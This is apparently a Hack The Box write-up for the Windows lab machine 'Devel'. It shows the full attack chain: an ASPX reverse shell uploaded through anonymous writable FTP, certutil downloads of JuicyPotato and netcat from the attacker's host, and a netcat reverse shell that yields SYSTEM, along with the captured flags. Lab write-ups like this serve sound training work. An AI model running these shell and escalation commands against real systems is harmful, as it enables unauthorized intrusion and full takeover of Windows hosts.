---
title: "Devel - Writeup"
linkTitle: "Devel"
weight: 15
featured: true
platform: "HTB"
name: "Devel"
os: "Windows"
difficulty: "Easy"
release: "04 Mar 2017"
ip: "10.129.30.84"
# Drop a real avatar at static/img/htb/devel.png and uncomment:
# avatar: "/img/htb/devel.png"
tags: ["windows", "ftp", "anonymous-login", "ms15-034", "iis", "aspx-reverse-shell", "seimpersonateprivilege", "juicypotato", "root-shell"]
description: "Easy Windows box. Anonymous FTP write access on an IIS webroot leads to an ASPX webshell, and SeImpersonatePrivilege closes the gap to SYSTEM via JuicyPotato."
---
{{< htb name="Devel" os="Windows" difficulty="Easy" release="04 Mar 2017" ip="10.129.30.84" platform="HTB" >}}

## Reconnaissance

```
(root㉿kali)# rustscan -a 10.129.30.84
```
```
Open 10.129.30.84:21
Open 10.129.30.84:80
```

```
(root㉿kali)# nmap 10.129.30.84 -p21,80 -sCV --script ftp-vuln*,http-vuln*
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
| http-vuln-cve2015-1635: 
|   VULNERABLE:
|   Remote Code Execution in HTTP.sys (MS15-034)
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows
```

Nmap's NSE scripts flag the box as vulnerable to MS15-034 (HTTP.sys RCE) right away, but with only FTP and IIS exposed, FTP is worth checking first.

## Enumeration

```
(root㉿kali)# ftp 10.129.30.84
```
```
Connected to 10.129.30.84.
220 Microsoft FTP Service
Name (10.129.30.84:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
```

```
ftp> ls
```
```
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
```

Anonymous FTP is not just readable — it's **writable**, and the FTP root maps directly onto the IIS webroot. Anything uploaded here becomes instantly reachable over HTTP.

## Initial Foothold

Grabbed the classic [aspx-reverse-shell](https://github.com/borjmz/aspx-reverse-shell), edited it with the attacker IP/port, and dropped it straight into the webroot over the same FTP session:

```
ftp> put shell.aspx
```

```
(root㉿kali)# rlwrap nc -lnvp 443
```
```
(root㉿kali)# curl http://10.129.30.84/shell.aspx
```
```
listening on [any] 443 ...
connect to [10.10.15.249] from (UNKNOWN) [10.129.30.84] 49203
```

A single `curl` request is enough to trigger it — IIS executes the ASPX page and the reverse shell fires back immediately.

## Privilege Escalation

```
c:\Users>whoami /all
```
```
User Name       SID
=============== ==============================================================
iis apppool\web S-1-5-82-2971860261-2701350812-2118117159-340795515-2183480550

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

`SeImpersonatePrivilege` is **Enabled** for the IIS app pool identity — the classic trigger for the "Potato family" of privilege escalation tools.

Before picking a tool, enumerate the OS so the right build and architecture get chosen:

```
c:\Users>systeminfo
```
```
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
System Manufacturer:       VMware, Inc.
System Type:               X86-based PC
Hotfix(s):                 N/A
```

Two details from `systeminfo` drive the whole approach:

- **`System Type: X86-based PC`** — the OS is 32-bit, not x64. This is what decides *which* JuicyPotato binary to use: on a 32-bit OS the correct build is **`Juicy.Potato.x86.exe`**. Handing the loader an x64 binary on a 32-bit system fails with `The system cannot execute the specified program` — a loader error, not an exploitation failure.
- **`Hotfix(s): N/A`** — an unpatched Windows 7 (Build 7600) with no KBs installed. Combined with `SeImpersonatePrivilege`, [JuicyPotato](https://github.com/ohpe/juicy-potato) is a direct, low-noise path to SYSTEM.

Transfer the **x86** JuicyPotato binary and netcat to the target:

```
c:\Users>certutil -urlcache -split -f http://10.10.15.249:8080/Juicy.Potato.x86.exe C:\Windows\Temp\Juicy.Potato.x86.exe
c:\Users>certutil -urlcache -split -f http://10.10.15.249:8080/nc.exe C:\Windows\Temp\nc.exe
```

### Finding a valid CLSID

JuicyPotato needs the CLSID of a COM object that activates under a high-privilege (`LocalService` / SYSTEM) context. Rather than guessing, query the registry for COM objects registered as `LocalService`:

```
c:\>reg query HKCR\CLSID /s /f LocalService
```
```
HKEY_CLASSES_ROOT\CLSID\{8BC3F05E-D86B-11D0-A075-00C04FB68820}
    LocalService    REG_SZ    winmgmt

HKEY_CLASSES_ROOT\CLSID\{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
    LocalService    REG_SZ    winmgmt

HKEY_CLASSES_ROOT\CLSID\{C97FCC79-E628-407D-AE68-A06AD6D8B4D1}\LocalService

End of search: 3 match(es) found.
```

This confirms locally-registered candidates. The most reliable reference is the per-OS [CLSID list](https://github.com/ohpe/juicy-potato/tree/master/CLSID) in the JuicyPotato repo — each Windows version has a CLSID known to activate as SYSTEM. For Windows 7 we pick a working CLSID and pass it with `-c`. If the first candidate doesn't yield a SYSTEM token, try the next from the list — not every CLSID activates on every build.

### Getting SYSTEM

JuicyPotato coerces the chosen privileged COM object (via its CLSID) into authenticating locally as SYSTEM, then hijacks that token to spawn a process with full SYSTEM rights. Note the binary is the **x86** build, matching the `System Type` found above:

```
c:\Users>Juicy.Potato.x86.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe -e cmd.exe 10.10.15.249 4411" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```
```
listening on [any] 4411 ...
connect to [10.10.15.249] from (UNKNOWN) [10.129.30.84] 49203

C:\Windows\system32>whoami
nt authority\system
```

```
C:\Windows\system32> type C:\Users\babis\Desktop\user.txt
```
```
26cce6baf1fc22e1ea417098d3a0128e
```

```
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```
```
ab18e7b8b9048f35e82e37484691abd7
```

## Lessons learned

- Nmap flagging a CVE doesn't mean it's the intended path — MS15-034 was a red herring here; anonymous FTP with write access was the actual way in.
- Anonymous FTP being *readable* is common and often boring; always check whether it's also **writable** before moving on, especially when the FTP root and web root look like they might overlap.
- `SeImpersonatePrivilege` enabled on a service account is one of the highest-value findings in a Windows `whoami /all` output — it almost always means Potato-family tools will get you to SYSTEM.
- **Read `systeminfo` before choosing a tool.** `System Type` decides x86 vs x64 — a mismatch produces the misleading "cannot execute the specified program" error rather than an exploitation failure. `Hotfix(s)` and the OS build tell you whether token impersonation (quiet) or a kernel exploit (noisy) fits better.
- On old, unpatched Windows boxes (Build 7600, no KBs installed), check for the simplest privesc first — a token-impersonation tool is far less noisy than chasing a kernel exploit.
